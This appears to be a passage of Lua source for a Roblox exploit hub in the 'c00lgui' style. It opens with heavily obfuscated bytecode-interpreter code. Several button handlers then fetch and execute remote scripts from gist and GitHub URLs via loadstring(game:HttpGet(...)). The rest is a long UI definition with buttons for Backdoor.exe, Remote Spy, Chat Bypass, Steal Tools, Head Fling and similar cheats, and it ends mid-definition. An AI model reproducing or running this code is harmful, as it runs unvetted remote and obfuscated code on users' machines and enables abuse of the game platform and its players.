l+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];end;elseif snap_lIIlIIIllIIlIIIlI<=33 then if snap_lIIlIIIllIIlIIIlI>32 then if snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]then snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;else snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[3];end;else snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];end;elseif snap_lIIlIIIllIIlIIIlI<=34 then snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];elseif snap_lIIlIIIllIIlIIIlI==35 then local snap_IlIlIIlIlIllIllIl=snap_llIIlIlIlIllIlIl[2];local snap_llIIlIIlIlIllIl=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]];snap_lIllIlIIIllIIIllIlIlllIlI[snap_IlIlIIlIlIllIllIl+1]=snap_llIIlIIlIlIllIl;snap_lIllIlIIIllIIIllIlIlllIlI[snap_IlIlIIlIlIllIllIl]=snap_llIIlIIlIlIllIl[snap_llIIlIlIlIllIlIl[4]];else snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]];end;snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;end;end);end;return snap_IlllllIlIIIIIIIlll(true,{},snap_llllllllIIllllIlI())();end)(string.byte,table.insert,setmetatable);
	end)
end
coroutine.wrap(VVCPTG_fake_script)()
local function SJWUJQ_fake_script() -- Zombie.LocalScript 
	local script = Instance.new('LocalScript', Zombie)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://gist.githubusercontent.com/someunknowndude/18f1d979ad9a25ad69064be75f55f735/raw/dc36f1e9ad906a7434bd77bcd0ce8218fb5f4d88/zombie.lua"))()
	end)
end
coroutine.wrap(SJWUJQ_fake_script)()
local function QJGO_fake_script() -- Frame.Smooth GUI Dragging 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(QJGO_fake_script)()
local function DTXFN_fake_script() -- LaserArm.LocalScript 
	local script = Instance.new('LocalScript', LaserArm)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/rouxhaver/scripts-2/main/FE%20Laser%20Arm.Lua"))()
	end)
end
coroutine.wrap(DTXFN_fake_script)()
local function KYUTNWQ_fake_script() -- Btools.LocalScript 
	local script = Instance.new('LocalScript', Btools)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/rouxhaver/scripts-2/main/FE%20BTools%20V3.Lua"))()
	end)
end
coroutine.wrap(KYUTNWQ_fake_script)()
local function DEVR_fake_script() -- c00lgui.LocalScript 
	local script = Instance.new('LocalScript', c00lgui)

	script.Parent.MouseButton1Click:Connect(function()
		local culgui = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local Page1 = Instance.new("Frame")
		local AdminCommandsGuis = Instance.new("Frame")
		local Backdoorexe = Instance.new("TextButton")
		local ScriptSpy = Instance.new("TextButton")
		local T0PK3K = Instance.new("TextButton")
		local audiolagger = Instance.new("TextButton")
		local RemoteSpy = Instance.new("TextButton")
		local InfiniteYield = Instance.new("TextButton")
		local FatesAdmin = Instance.new("TextButton")
		local UnanchoredGui = Instance.new("TextButton")
		local ChatHaxx = Instance.new("TextButton")
		local PendulumHub = Instance.new("TextButton")
		local Hydroxide = Instance.new("TextButton")
		local Opfinality = Instance.new("TextButton")
		local Title = Instance.new("TextLabel")
		local Homebrewadmin = Instance.new("TextButton")
		local CMDX = Instance.new("TextButton")
		local Scripts = Instance.new("Frame")
		local Bringallplayersheads = Instance.new("TextButton")
		local singc00lkiddtheme = Instance.new("TextButton")
		local Platform = Instance.new("TextButton")
		local HeadFling = Instance.new("TextButton")
		local ChatBypass = Instance.new("TextButton")
		local FloatingPad = Instance.new("TextButton")
		local HeadShake = Instance.new("TextButton")
		local NameTag = Instance.new("TextButton")
		local ControlNPCs = Instance.new("TextButton")
		local Getallitems = Instance.new("TextButton")
		local Blackhole = Instance.new("TextButton")
		local WalkOnWalls = Instance.new("TextButton")
		local Title_2 = Instance.new("TextLabel")
		local SCP173 = Instance.new("TextButton")
		local SCP106 = Instance.new("TextButton")
		local Title_3 = Instance.new("TextLabel")
		local Settings = Instance.new("Frame")
		local Page1_2 = Instance.new("Frame")
		local Walkspeed = Instance.new("Frame")
		local TextBox = Instance.new("TextBox")
		local Title_4 = Instance.new("TextLabel")
		local TextButton = Instance.new("TextButton")
		local God = Instance.new("Frame")
		local TextButton_2 = Instance.new("TextButton")
		local Title_5 = Instance.new("TextLabel")
		local Invisibility = Instance.new("Frame")
		local TextButton_3 = Instance.new("TextButton")
		local Title_6 = Instance.new("TextLabel")
		local JumpPower = Instance.new("Frame")
		local TextBox_2 = Instance.new("TextBox")
		local Title_7 = Instance.new("TextLabel")
		local TextButton_4 = Instance.new("TextButton")
		local Title_8 = Instance.new("TextLabel")
		local Netless = Instance.new("Frame")
		local TextButton_5 = Instance.new("TextButton")
		local Title_9 = Instance.new("TextLabel")
		local c00lguireawakened = Instance.new("Frame")
		local TextButton_6 = Instance.new("TextButton")
		local Title_10 = Instance.new("TextLabel")
		local TextButton_7 = Instance.new("TextButton")
		local TextButton_8 = Instance.new("TextButton")
		local Title_11 = Instance.new("TextLabel")
		local Page3 = Instance.new("TextButton")
		local idk = Instance.new("TextButton")
		local Page2 = Instance.new("Frame")
		local Title_12 = Instance.new("TextLabel")
		local AntiChatLog = Instance.new("Frame")
		local TextButton_9 = Instance.new("TextButton")
		local Title_13 = Instance.new("TextLabel")
		local Exitc00lgui = Instance.new("Frame")
		local TextButton_10 = Instance.new("TextButton")
		local Title_14 = Instance.new("TextLabel")
		local Next = Instance.new("TextButton")
		local Previous = Instance.new("TextButton")
		local Title_15 = Instance.new("TextLabel")
		local Page2_2 = Instance.new("Frame")
		local GearTools = Instance.new("Frame")
		local SuicideGun = Instance.new("TextButton")
		local GravityGun = Instance.new("TextButton")
		local StealTools = Instance.new("TextButton")
		local DevUzi = Instance.new("TextButton")
		local M4Carbine = Instance.new("TextButton")
		local Uzi = Instance.new("TextButton")
		local AK47 = Instance.new("TextButton")
		local M3GreaseGun = Instance.new("TextButton")
		local Empty = Instance.new("TextButton")
		local Empty_2 = Instance.new("TextButton")
		local Empty_3 = Instance.new("TextButton")
		local Empty_4 = Instance.new("TextButton")
		local Title_16 = Instance.new("TextLabel")
		local Empty_5 = Instance.new("TextButton")
		local Empty_6 = Instance.new("TextButton")
		local WeaponScripts = Instance.new("Frame")
		local Goner = Instance.new("TextButton")
		local TrueSSHub = Instance.new("TextButton")
		local GoodCopBadCop = Instance.new("TextButton")
		local FallenAnger = Instance.new("TextButton")
		local NullwareHub = Instance.new("TextButton")
		local PunchScript = Instance.new("TextButton")
		local _500PoundsBall = Instance.new("TextButton")
		local GermanSoldier = Instance.new("TextButton")
		local Minigun = Instance.new("TextButton")
		local GKV3 = Instance.new("TextButton")
		local GrabKnifeV4 = Instance.new("TextButton")
		local Empty_7 = Instance.new("TextButton")
		local Empty_8 = Instance.new("TextButton")
		local Empty_9 = Instance.new("TextButton")
		local Title_17 = Instance.new("TextLabel")
		local Title_18 = Instance.new("TextLabel")
		local cool = Instance.new("Frame")
		local idk_2 = Instance.new("TextButton")
		local Page3_2 = Instance.new("Frame")
		local Title_19 = Instance.new("TextLabel")
		local Clear = Instance.new("TextButton")
		local Execute = Instance.new("TextButton")
		local Input = Instance.new("TextBox")
		local CloseOpen = Instance.new("TextButton")
	
		--Properties:
	
		culgui.Name = "culgui"
		culgui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		culgui.ResetOnSpawn = false
	
		Frame.Parent = culgui
		Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Frame.BorderSizePixel = 3
		Frame.Position = UDim2.new(0, 3, 0.300000012, 0)
		Frame.Size = UDim2.new(0, 300, 0, 400)
	
		Page1.Name = "Page1"
		Page1.Parent = Frame
		Page1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Page1.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Page1.BorderSizePixel = 3
		Page1.Position = UDim2.new(0, 0, 0, 83)
		Page1.Size = UDim2.new(1, 0, 1, -106)
		Page1.ZIndex = 2
	
		AdminCommandsGuis.Name = "Admin Commands/Guis"
		AdminCommandsGuis.Parent = Page1
		AdminCommandsGuis.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		AdminCommandsGuis.BorderColor3 = Color3.fromRGB(255, 0, 0)
		AdminCommandsGuis.BorderSizePixel = 3
		AdminCommandsGuis.Position = UDim2.new(0.5, 3, 0, 0)
		AdminCommandsGuis.Size = UDim2.new(0.5, -3, 1, 0)
		AdminCommandsGuis.ZIndex = 2
	
		Backdoorexe.Name = "Backdoor.exe"
		Backdoorexe.Parent = AdminCommandsGuis
		Backdoorexe.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Backdoorexe.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Backdoorexe.BorderSizePixel = 3
		Backdoorexe.Position = UDim2.new(0, 0, 0, 33)
		Backdoorexe.Size = UDim2.new(0.5, 0, 0, 30)
		Backdoorexe.ZIndex = 2
		Backdoorexe.Font = Enum.Font.SourceSans
		Backdoorexe.Text = "Backdoor.exe"
		Backdoorexe.TextColor3 = Color3.fromRGB(255, 255, 255)
		Backdoorexe.TextSize = 14.000
	
		ScriptSpy.Name = "ScriptSpy"
		ScriptSpy.Parent = AdminCommandsGuis
		ScriptSpy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ScriptSpy.BorderColor3 = Color3.fromRGB(255, 0, 0)
		ScriptSpy.BorderSizePixel = 3
		ScriptSpy.Position = UDim2.new(0.5, 3, 0, 33)
		ScriptSpy.Size = UDim2.new(0.5, -3, 0, 30)
		ScriptSpy.ZIndex = 2
		ScriptSpy.Font = Enum.Font.SourceSans
		ScriptSpy.Text = "ScriptSpy"
		ScriptSpy.TextColor3 = Color3.fromRGB(255, 255, 255)
		ScriptSpy.TextSize = 14.000
		ScriptSpy.TextWrapped = true
	
		T0PK3K.Name = "T0PK3K"
		T0PK3K.Parent = AdminCommandsGuis
		T0PK3K.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		T0PK3K.BorderColor3 = Color3.fromRGB(255, 0, 0)
		T0PK3K.BorderSizePixel = 3
		T0PK3K.Position = UDim2.new(0, 0, 0, 66)
		T0PK3K.Size = UDim2.new(0.5, 0, 0, 30)
		T0PK3K.ZIndex = 2
		T0PK3K.Font = Enum.Font.SourceSans
		T0PK3K.Text = "T0PK3K"
		T0PK3K.TextColor3 = Color3.fromRGB(255, 255, 255)
		T0PK3K.TextSize = 14.000
		T0PK3K.TextWrapped = true
	
		audiolagger.Name = "audio lagger"
		audiolagger.Parent = AdminCommandsGuis
		audiolagger.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		audiolagger.BorderColor3 = Color3.fromRGB(255, 0, 0)
		audiolagger.BorderSizePixel = 3
		audiolagger.Position = UDim2.new(0.5, 3, 0, 66)
		audiolagger.Size = UDim2.new(0.5, -3, 0, 30)
		audiolagger.ZIndex = 2
		audiolagger.Font = Enum.Font.SourceSans
		audiolagger.Text = "audio logger"
		audiolagger.TextColor3 = Color3.fromRGB(255, 255, 255)
		audiolagger.TextSize = 14.000
	
		RemoteSpy.Name = "Remote Spy"
		RemoteSpy.Parent = AdminCommandsGuis
		RemoteSpy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		RemoteSpy.BorderColor3 = Color3.fromRGB(255, 0, 0)
		RemoteSpy.BorderSizePixel = 3
		RemoteSpy.Position = UDim2.new(0, 0, 0, 99)
		RemoteSpy.Size = UDim2.new(0.5, 0, 0, 30)
		RemoteSpy.ZIndex = 2
		RemoteSpy.Font = Enum.Font.SourceSans
		RemoteSpy.Text = "Remote Spy"
		RemoteSpy.TextColor3 = Color3.fromRGB(255, 255, 255)
		RemoteSpy.TextSize = 14.000
	
		InfiniteYield.Name = "Infinite Yield"
		InfiniteYield.Parent = AdminCommandsGuis
		InfiniteYield.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		InfiniteYield.BorderColor3 = Color3.fromRGB(255, 0, 0)
		InfiniteYield.BorderSizePixel = 3
		InfiniteYield.Position = UDim2.new(0.5, 3, 0, 99)
		InfiniteYield.Size = UDim2.new(0.5, -3, 0, 30)
		InfiniteYield.ZIndex = 2
		InfiniteYield.Font = Enum.Font.SourceSans
		InfiniteYield.Text = "Infinite Yield"
		InfiniteYield.TextColor3 = Color3.fromRGB(255, 255, 255)
		InfiniteYield.TextSize = 14.000
		InfiniteYield.TextWrapped = true
	
		FatesAdmin.Name = "Fates Admin"
		FatesAdmin.Parent = AdminCommandsGuis
		FatesAdmin.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		FatesAdmin.BorderColor3 = Color3.fromRGB(255, 0, 0)
		FatesAdmin.BorderSizePixel = 3
		FatesAdmin.Position = UDim2.new(0, 0, 0, 132)
		FatesAdmin.Size = UDim2.new(0.5, 0, 0, 30)
		FatesAdmin.ZIndex = 2
		FatesAdmin.Font = Enum.Font.SourceSans
		FatesAdmin.Text = "Fates Admin"
		FatesAdmin.TextColor3 = Color3.fromRGB(255, 255, 255)
		FatesAdmin.TextSize = 14.000
	
		UnanchoredGui.Name = "Unanchored Gui"
		UnanchoredGui.Parent = AdminCommandsGuis
		UnanchoredGui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		UnanchoredGui.BorderColor3 = Color3.fromRGB(255, 0, 0)
		UnanchoredGui.BorderSizePixel = 3
		UnanchoredGui.Position = UDim2.new(0.5, 3, 0, 132)
		UnanchoredGui.Size = UDim2.new(0.5, -3, 0, 30)
		UnanchoredGui.ZIndex = 2
		UnanchoredGui.Font = Enum.Font.SourceSans
		UnanchoredGui.Text = "Unanchored Gui"
		UnanchoredGui.TextColor3 = Color3.fromRGB(255, 255, 255)
		UnanchoredGui.TextSize = 14.000
		UnanchoredGui.TextWrapped = true
	
		ChatHaxx.Name = "ChatHaxx"
		ChatHaxx.Parent = AdminCommandsGuis
		ChatHaxx.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ChatHaxx.BorderColor3 = Color3.fromRGB(255, 0, 0)
		ChatHaxx.BorderSizePixel = 3
		ChatHaxx.Position = UDim2.new(0, 0, 0, 165)
		ChatHaxx.Size = UDim2.new(0.499000013, 0, 0, 30)
		ChatHaxx.ZIndex = 2
		ChatHaxx.Font = Enum.Font.SourceSans
		ChatHaxx.Text = "ChatHaxx"
		ChatHaxx.TextColor3 = Color3.fromRGB(255, 255, 255)
		ChatHaxx.TextSize = 14.000
	
		PendulumHub.Name = "Pendulum Hub"
		PendulumHub.Parent = AdminCommandsGuis
		PendulumHub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		PendulumHub.BorderColor3 = Color3.fromRGB(255, 0, 0)
		PendulumHub.BorderSizePixel = 3
		PendulumHub.Position = UDim2.new(0.5, 3, 0, 165)
		PendulumHub.Size = UDim2.new(0.5, -3, 0, 30)
		PendulumHub.ZIndex = 2
		PendulumHub.Font = Enum.Font.SourceSans
		PendulumHub.Text = "Pendulum"
		PendulumHub.TextColor3 = Color3.fromRGB(255, 255, 255)
		PendulumHub.TextSize = 14.000
	
		Hydroxide.Name = "Hydroxide"
		Hydroxide.Parent = AdminCommandsGuis
		Hydroxide.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Hydroxide.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Hydroxide.BorderSizePixel = 3
		Hydroxide.Position = UDim2.new(0, 0, 0, 198)
		Hydroxide.Size = UDim2.new(0.499000013, 0, 0, 30)
		Hydroxide.ZIndex = 3
		Hydroxide.Font = Enum.Font.SourceSans
		Hydroxide.Text = "Hydroxide"
		Hydroxide.TextColor3 = Color3.fromRGB(255, 255, 255)
		Hydroxide.TextSize = 14.000
		Hydroxide.TextWrapped = true
	
		Opfinality.Name = "Opfinality"
		Opfinality.Parent = AdminCommandsGuis
		Opfinality.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Opfinality.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Opfinality.BorderSizePixel = 3
		Opfinality.Position = UDim2.new(0.5, 3, 0, 198)
		Opfinality.Size = UDim2.new(0.5, -3, 0, 30)
		Opfinality.ZIndex = 2
		Opfinality.Font = Enum.Font.SourceSans
		Opfinality.Text = "Opfinality"
		Opfinality.TextColor3 = Color3.fromRGB(255, 255, 255)
		Opfinality.TextSize = 14.000
	
		Title.Name = "Title"
		Title.Parent = AdminCommandsGuis
		Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Title.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Title.BorderSizePixel = 3
		Title.Size = UDim2.new(1, 0, 0, 30)
		Title.ZIndex = 2
		Title.Font = Enum.Font.SourceSansBold
		Title.Text = "Admin Commands/Guis"
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextSize = 14.000
	
		Homebrewadmin.Name = "Homebrew admin"
		Homebrewadmin.Parent = AdminCommandsGuis
		Homebrewadmin.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Homebrewadmin.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Homebrewadmin.BorderSizePixel = 3
		Homebrewadmin.Position = UDim2.new(0, 0, 0, 228)
		Homebrewadmin.Size = UDim2.new(0.499000013, 0, 0, 30)
		Homebrewadmin.ZIndex = 3
		Homebrewadmin.Font = Enum.Font.SourceSans
		Homebrewadmin.Text = "Homebrew Admin"
		Homebrewadmin.TextColor3 = Color3.fromRGB(255, 255, 255)
		Homebrewadmin.TextSize = 14.000
		Homebrewadmin.TextWrapped = true
	
		CMDX.Name = "CMD-X"
		CMDX.Parent = AdminCommandsGuis
		CMDX.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		CMDX.BorderColor3 = Color3.fromRGB(255, 0, 0)
		CMDX.BorderSizePixel = 3
		CMDX.Position = UDim2.new(0.5, 3, 0.10204082, 198)
		CMDX.Size = UDim2.new(0.5, -3, 0, 30)
		CMDX.ZIndex = 2
		CMDX.Font = Enum.Font.SourceSans
		CMDX.Text = "CMD-X"
		CMDX.TextColor3 = Color3.fromRGB(255, 255, 255)
		CMDX.TextSize = 14.000
	
		Scripts.Name = "Scripts"
		Scripts.Parent = Page1
		Scripts.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Scripts.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Scripts.BorderSizePixel = 3
		Scripts.Size = UDim2.new(0.5, -3, 1, 0)
		Scripts.ZIndex = 2
	
		Bringallplayersheads.Name = "Bring all player's heads"
		Bringallplayersheads.Parent = Scripts
		Bringallplayersheads.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Bringallplayersheads.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Bringallplayersheads.BorderSizePixel = 3
		Bringallplayersheads.Position = UDim2.new(0, 0, 0, 33)
		Bringallplayersheads.Size = UDim2.new(0.5, 0, 0, 30)
		Bringallplayersheads.ZIndex = 2
		Bringallplayersheads.Font = Enum.Font.SourceSans
		Bringallplayersheads.Text = "Bring all head"
		Bringallplayersheads.TextColor3 = Color3.fromRGB(255, 255, 255)
		Bringallplayersheads.TextSize = 14.000
	
		singc00lkiddtheme.Name = "sing c00lkidd theme"
		singc00lkiddtheme.Parent = Scripts
		singc00lkiddtheme.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		singc00lkiddtheme.BorderColor3 = Color3.fromRGB(255, 0, 0)
		singc00lkiddtheme.BorderSizePixel = 3
		singc00lkiddtheme.Position = UDim2.new(0.5, 3, 0, 33)
		singc00lkiddtheme.Size = UDim2.new(0.5, -3, 0, 30)
		singc00lkiddtheme.ZIndex = 2
		singc00lkiddtheme.Font = Enum.Font.SourceSans
		singc00lkiddtheme.Text = "sing c00lkidd theme"
		singc00lkiddtheme.TextColor3 = Color3.fromRGB(255, 255, 255)
		singc00lkiddtheme.TextSize = 14.000
		singc00lkiddtheme.TextWrapped = true
	
		Platform.Name = "Platform"
		Platform.Parent = Scripts
		Platform.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Platform.BorderColor3 = Color3.fromRGB(255, 0, 0)
		Platform.BorderSizePixel = 3
		Platform.Position = UDim2.new(0, 0, 0, 66)
		Platform.Size = UDim2.new(0.5, 0, 0, 30)
		Platform.ZIndex = 2
		Platform.Font = Enum.Font.SourceSans
		Platform.Text = "Platform"
		Platform.TextColor3 = Color3.fromRGB(255, 255, 255)
		Platform.TextSize = 14.000
		Platform.TextWrapped = true
	
		HeadFling.Name = "Head Fling"
		HeadFling.Parent = Scripts
		HeadFling.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		HeadFling.BorderColor3 = Color3.fromRGB(255, 0, 0)
		HeadFling.BorderSizePixel = 3
		HeadFling.Position = UDim2.new(0.5, 3, 0, 66)
		HeadFling.Size = UDim2.new(0.5, -3, 0, 30)
		HeadFling.ZIndex = 2
		HeadFling.Font = Enum.Font.SourceSans
		HeadFling.Text = "Head Fling"
		HeadFling.TextColor3 = Color3.fromRGB(255, 255, 255)
		HeadFling.TextSize = 14.000
		HeadFling.TextWrapped = true
	
		ChatBypass.Name = "Chat Bypass"
		ChatBypass.Parent = Scripts
		ChatBypass.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		ChatBypass.BorderColor3 = Color3.fromRGB(255, 0, 0)
		ChatBypass.BorderSizePixel = 3
		ChatBypass.Position = UDim2.new(0, 0, 0, 99)
		ChatBypass.Size = UDim2.new(0.499000013, 0, 0, 30)
		ChatBypass.ZIndex = 2
		ChatBypass.Font = Enum.Font.SourceSans
